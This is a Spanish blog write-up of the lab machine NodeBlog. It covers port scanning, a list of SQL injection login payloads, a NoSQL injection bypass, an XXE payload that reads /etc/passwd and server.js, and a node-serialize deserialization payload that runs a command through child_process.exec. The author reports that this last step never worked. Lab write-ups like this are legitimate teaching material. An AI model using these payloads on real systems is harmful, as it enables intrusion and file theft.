---
title: NodeBlog WriteUp
date: 2023-05-29
categories: [WriteUps, Máquinas Linux]
tags: [SQLi, XXE]
image:
  path: ../../assets/img/writeups/NodeBlog/nodeBlog.png
  width: 528
  height: 340
  alt: Banner NodeBlog
---

Máquina no acabada porque no me deserializaba la data. Pero la caja está chula. Tenemos un Nosqli, despues un XXE y para rematar un Deserialization Attack, que no me funciona.  
Aun así la subo, porque siempre se aprende algo y joder no estaba haciendo el post para luego no subirlo.  
Besicos.

## Reconocimiento

Hoy chicas y chicos pentestearemos la máquina llamada NodeBlog, con ip `10.10.11.139`. ¡Vamos a aprender!.

Lo primero es comprobar que tenemos conectividad con la máquina, para ello hacemos un ping:
``` 
❯ ping -c 1 10.10.11.139
PING 10.10.11.139 (10.10.11.139) 56(84) bytes of data.
64 bytes from 10.10.11.139: icmp_seq=1 ttl=63 time=43.3 ms

--- 10.10.11.139 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.321/43.321/43.321/0.000 ms
```
Un paquete envíado, un paquete recibido, hay conectividad.

¿Qué puertos tiene abiertos?. Para poder atacar a estos. Usemons nmap:
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.139 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-28 11:22 CEST
Initiating SYN Stealth Scan at 11:22
Scanning 10.10.11.139 [65535 ports]
Discovered open port 22/tcp on 10.10.11.139
Discovered open port 5000/tcp on 10.10.11.139
Completed SYN Stealth Scan at 11:23, 12.17s elapsed (65535 total ports)
Nmap scan report for 10.10.11.139
Host is up, received user-set (0.043s latency).
Scanned at 2023-05-28 11:22:52 CEST for 12s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```
Tenemos los puertos 22/ssh y 5000/upnp. ¿Qué es upnp?.  
**UPnP** (Universal Plug and Play) está formado por una serie de protocolos de comunicación estandarizados para poder facilitar la conectividad entre diferentes dispositivos de tu red privada. Una de sus funciones más importantes es permitir que un programa solicite al router que abra puertos cuando este necesite una comunicación con un servidor.

Esto significan las opciones usadas en el escaneo anterior:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.139 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Realizemos un escaner más profundo de esos puertos:
```
❯ nmap -p22,5000 -sC -sV 10.10.11.139 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-28 11:28 CEST
Nmap scan report for 10.10.11.139
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Al final resulta que ese puerto 5000 es una web, nos pone http en la columna Service, además parece que corre un Node.js en la web. Hoy estoy muy curioso así que pondré que es, si ya lo sabéis saltarlo:
```
Node.js es un entorno en tiempo de ejecución multiplataforma, de código abierto, para la capa del servidor basado en el lenguaje de programación JavaScript.

¿Y qué es un entorno de ejecución?. En este caso un entorno de ejecución para java sería esto:
El entorno en tiempo de ejecución de Java (JRE) es un software que los programas de Java necesitan para ejecutarse correctamente. Java es un lenguaje de computación en el que se basan numerosas aplicaciones web y móviles actuales. El JRE es una tecnología subyacente que comunica el programa de Java con el sistema operativo. Actúa como traductor y facilitador, y brinda todos los recursos de modo que, una vez que escribe un software de Java, se ejecuta en cualquier sistema operativo sin necesidad de más modificaciones.
```
Muy bien, así que tenemos los puertos 22/ssh y 80/http abiertos.

## Buscando vulnerabilidades

Usaré la herramienta whatweb para comprobar que tecnologías corren por detrás de la web:
```
❯ whatweb http://10.10.11.139:5000

http://10.10.11.139:5000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.139], Script[JavaScript], Title[Blog], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```
Express.js es un marco de desarrollo minimalista para Nodejs.

Veamos que pinta tiene la web desde el navegador

![Web]({{ 'assets/img/writeups/NodeBlog/web.png' | relative_url }}){: .center-image }

Hablan de jugar para clasificarse en algún campeonato. Leyendo el código fuente de esa misma página no veo nada interesante.  
Le doy a "Login" y visualizamos el panel de logeo:

![Login]({{ 'assets/img/writeups/NodeBlog/login.png' | relative_url }}){: .center-image }

Purebo algunas credenciales típicas como; admin:admin, admin:passwd, guest:guest, admin:1234. Y como he visto uhc en la página anterior también pruebo alguna combinación con esa palabra. Pero nada.

Abriré el burpsuie para probar algunas inyecciones al panel de login.

Una vez interceptada una petición las **inyecciones** que pruebo dentro del campo user y password son las siguientes:
```
Dentro del Burp en campos user y password. Recuerda url-encodear con Ctrl + U:
user=admin'&password=admin'
user=admin' or 1=1-- -&password=admin' or 1=1-- -
user=admin' and 1=1-- -&password=admin' and 1=1-- -
user=admin" or 1=1-- -&password=admin" or 1=1-- -
user=admin') or 1=1-- -&password=admin') or 1=1-- -
user=admin' order by 100-- -&password=admin' order by 100-- -
user=admin' order by 1-- -&password=admin' order by 1-- -
user=admin' union select 1-- -&password=admin' union select 1-- -
user=admin' union select 1,2-- -&password=admin' union select 1,2-- -
user=admin' union select 1,2,3-- -&password=admin' union select 1,2,3-- -
Y así hasta 6
```
Ahora salto a probar una inyección NoSQL, y esta sí que funciona:

![Nosqli]({{ 'assets/img/writeups/NodeBlog/nosqli.png' | relative_url }}){: .center-image }


Recomendable usar [payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Salen muchas vulnerabilidades e inyecciones, entre ellas la NoSQL.

Puedo copiarme la cookie y pegarla en la parte de cookie en la consola del navegador (Ctrl +Shift+C) o bien copiar la petición del Repeater y pegarlo en la parte principal de Proxy y mandarla "Forward".  
Estamos dentro. Hay más mensajes, uno en el que recomienda que veamos un video con el que hizo la aplicación y que debe contar alguna vulnerabilidad. También hay dos opciones más: "New Article" y "Upload". Empezaré por probar a subir algo. Me creo un prueba.txt desde mi terminal:
```
❯ nano prueba.txt

Esto es un prueba y punto koh
```
Y la subo. No se ha debido subir, me indica lo siguiente; **Invalid XML Example: Example DescriptionExample Markdown**. Tiene que estar en formato XML.

![ErrorXML]({{ 'assets/img/writeups/NodeBlog/errorXml.png' | relative_url }}){: .center-image }

Esto me trae a la cabeza el ataque XXE, vulnerabilidad que puede existir si hay un XML. Siempre que te encuentres un XML por una web puedes pensar en este tipo de ataque.

Supongo que si voy al apartado "New Article" lo creo en formato XML. Así que crearé uno e interceptaré con burpsuite la petición para visualizar la estructura del XML.
```
POST /articles HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.139:5000/articles/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Origin: http://10.10.11.139:5000
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

title=Un+nuevo+d%C3%ADa+brillar%C3%A1&description=quiero+ver+el+rojo+del+amanecer%2C+un+nuevo+d%C3%ADa+brillar%C3%A1&markdown=esto+es+el+markdown+se+supone
```
Claro..Ahora que pienso esto posiblemente no tendría que estar en formato XML. Pero el artículo que se ha formado con lo que has envíado puede que si. Después de intentar subir un xml cualquiera:
``` xml
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```
Y que este no se suba. Se me ocurre(ahora..) inspeccionar el código fuente de la página que te marca el error de "Invalid XML..". Tenemos esto:
Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>  
Nos están poniendo por aquí la estructura de ejemplo que entiendo que hay que seguir para subir un XML válido.
``` xml 
<post>
  <title>Este es el title </title>
  <description>la description tralalalelele</description>
  <markdown>Y el Markdown trololo</markdown>
</post>
```
Subo el archivo y tiene pinta que me procesa el XML que subo y me muestra el contenido:

![Procesamiento]({{ 'assets/img/writeups/NodeBlog/procesamiento.png' | relative_url }}){: .center-image }

Tiene buena pinta. Si intento guardarlo se queda bloqueado y no se sube nada, ¿por qué? ni idea.. En este momento estuve un rato porque me empeñé que se subiera, pero no hace falta llegar ahí para probar un ataque XXE ya que el procesamiento ya se ha dado.

## Explotación

Modifico mi xxe desde mi consola:
``` xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<post>
    <title>Este es el title </title>
    <description>la description tralalalelele</description>
    <markdown>&xxe;</markdown>
</post>
```
Esa primera línea la consigo desde mi propio blog en "Método Hacking Web" en el apartado XXE. Esa info la recogí a su vez en la página de **portswigger**.

¡Funciona!. Consigo que me muestre el /etc/passwd.


![etcPaswd]({{ 'assets/img/writeups/NodeBlog/etcPasswd.png' | relative_url }}){: .center-image }

Un poco más abajo del /etc/passwd vemos al usuario admin. Fijandome en los usuarios que tienen un /bin/bash o un /bin/sh de shell puedo averiguar los usuarios. En este caso solo hay dos coincidencias; root y admin.

Intento ver la id_rsa del usuario admin pero no hay suerte. Busco por internet archivos comprometidos o que den más información en un **nodejs**, está server.js. Provocando un error mediante burpsuite a veces salen rutas (puse una comilla en un campo). Salió la ruta /opt/blog así que voy a buscar por /opt/blog/server.js

![ServerJs]({{ 'assets/img/writeups/NodeBlog/serverjs.png' | relative_url }}){: .center-image }

Encuentro rutas, servicios y alguna posible credencial. Así interesante está mongodb, una posible credencial; **UHC-SecretKey-123**. La pruebo para ssh pero nada. También veo node-serialize y debajo entiendo que se deserializa una data siendo esa data posiblemente la cookie. Si vemos esto, que hay una des/serialización y además corriendo node.js pensemos en un Deserialization Attack.

Yo busco directamente en mi blog, que tengo los apuntes de este ataque allí- están en Hacking Web- esos apuntes los recogí de esta página:  
 https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Lo explican muy bien. Copiaré directamente la linea serializada y modificaré el comando a mi gusto:
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.8',function(error, stdout, stderr) { console.log(stdout) }); }()"}
```
He cambiado el comando ls por el ping a mi máquina para comprobar que tengo RCE, además he quitado los \n y \t (espacios y tabuladores), y juntado el function al parentésis que le sigue.  
Bien, esa es la data serializada pero hay que pasarla a formato url-encode porque al enviarla mediante el navegador puede que de problemas si no. Lo hago mediate el burpsuite:

![BurpEncode]({{ 'assets/img/writeups/NodeBlog/burpcode.png' | relative_url }}){: .center-image }

Meto esa data urlencodeada en la parte de de la cookie en la consola del navegaodr peeero no hay manera de que me funcione..Ni quitando todos los espacios. En principio debería funcionar pero algo debo estar poniendo mal.  
Guillermo puede parecer una tontería peero al actualizar en vez de haberle dado tanto al enter en la url para recargar prueba más **fn + f5** para recargar página. Incluso puedes hacer antes **Ctrl + f5** para, además de actualizar, borrar los datos de la memoria caché.

Hasta la próxima, espero traerosla completa.